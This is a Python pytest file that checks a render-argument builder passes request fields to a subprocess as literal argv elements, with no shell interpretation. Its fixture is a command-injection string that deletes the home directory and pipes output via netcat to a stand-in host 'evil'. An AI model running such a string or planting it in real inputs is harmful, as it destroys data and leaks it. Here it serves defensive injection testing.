"""Tests for asset-bus render-arg argv construction (T-002)."""

from __future__ import annotations

import subprocess
import sys

import pytest

from promptclaw.asset_bus import (
    RenderArgError,
    build_render_argv,
    to_render_arg,
)


INJECTION_FIXTURE = "moody forest; rm -rf ~ && echo $(id) `whoami` | nc evil 1 > /tmp/x"


def test_to_render_arg_passes_injection_string_literally() -> None:
    assert to_render_arg(INJECTION_FIXTURE) == INJECTION_FIXTURE


def test_to_render_arg_accepts_scalar_types() -> None:
    assert to_render_arg("hello") == "hello"
    assert to_render_arg(42) == "42"
    assert to_render_arg(3.5) == "3.5"
    assert to_render_arg(True) == "true"
    assert to_render_arg(False) == "false"


def test_to_render_arg_rejects_none_bytes_and_containers() -> None:
    for bad in (None, b"bytes", bytearray(b"x"), ["a"], ("a",), {"k": "v"}, {1, 2}):
        with pytest.raises(RenderArgError):
            to_render_arg(bad)


def test_to_render_arg_rejects_nul_byte() -> None:
    with pytest.raises(RenderArgError):
        to_render_arg("prompt\x00with-nul")


def test_build_render_argv_keeps_injection_as_single_element() -> None:
    argv = build_render_argv(
        "asset_render_image",
        prompt=INJECTION_FIXTURE,
        count=2,
        size="768x768",
        seed=12345,
        loopable=True,
    )
    assert argv[0] == "asset_render_image"
    assert INJECTION_FIXTURE in argv
    # The injection fixture is exactly one argv element — not split, not shell-expanded.
    assert argv.count(INJECTION_FIXTURE) == 1
    # Flags use --kebab-case; bare True becomes a switch with no following value.
    assert "--prompt" in argv
    loopable_idx = argv.index("--loopable")
    following = argv[loopable_idx + 1 : loopable_idx + 2]
    assert following == [] or following[0].startswith("--")


def test_build_render_argv_drops_false_and_none_options() -> None:
    argv = build_render_argv("renderer", prompt="x", dry_run=False, seed=None)
    assert "--dry-run" not in argv
    assert "--seed" not in argv


def test_build_render_argv_rejects_unsafe_executable() -> None:
    for bad in ("", "foo\x00bar"):
        with pytest.raises(RenderArgError):
            build_render_argv(bad, prompt="x")


def test_injection_fixture_round_trips_through_subprocess_without_shell() -> None:
    """argv passed to subprocess.run with shell=False is not interpreted.

    This is the load-bearing acceptance check: build an argv with an
    injection fixture in a request field, hand it to the OS as argv, and
    verify the child process saw the literal bytes instead of expanding
    ``$(...)``, splitting on ``;``, or honoring redirections.
    """
    argv = build_render_argv(sys.executable, "-c", "import sys; print(sys.argv[1])", INJECTION_FIXTURE)
    completed = subprocess.run(  # noqa: S603 — argv is constructed, shell=False
        argv,
        capture_output=True,
        text=True,
        check=True,
    )
    assert completed.stdout.rstrip("\n") == INJECTION_FIXTURE
    assert completed.returncode == 0
